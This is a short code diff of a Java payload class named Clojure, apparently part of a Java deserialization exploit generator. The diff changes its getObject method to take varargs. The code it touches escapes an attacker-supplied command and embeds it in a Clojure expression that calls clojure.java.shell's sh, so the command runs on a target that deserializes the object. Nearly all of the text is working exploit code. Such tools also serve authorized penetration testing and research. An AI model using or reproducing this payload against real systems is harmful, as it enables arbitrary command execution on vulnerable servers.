@@ -28,7 +28,7 @@ import java.util.Map;
 @Authors({ Authors.JACKOFMOSTTRADES })
 public class Clojure extends PayloadRunner implements ObjectPayload<Map<?, ?>> {
 
-	public Map<?, ?> getObject(final String command) throws Exception {
+	public Map<?, ?> getObject(final String ... command) throws Exception {
 
 //		final String[] execArgs = command.split(" ");
 //		final StringBuilder commandArgs = new StringBuilder();
@@ -42,7 +42,7 @@ public class Clojure extends PayloadRunner implements ObjectPayload<Map<?, ?>> {
 //		final String clojurePayload =
 //				String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", commandArgs.substring(2));
 
-        String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\").split(" ")), " ", "\"", "\"");
+        String cmd = Strings.join(Arrays.asList(command[0].replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\").split(" ")), " ", "\"", "\"");
 
         final String clojurePayload =
             String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", cmd);
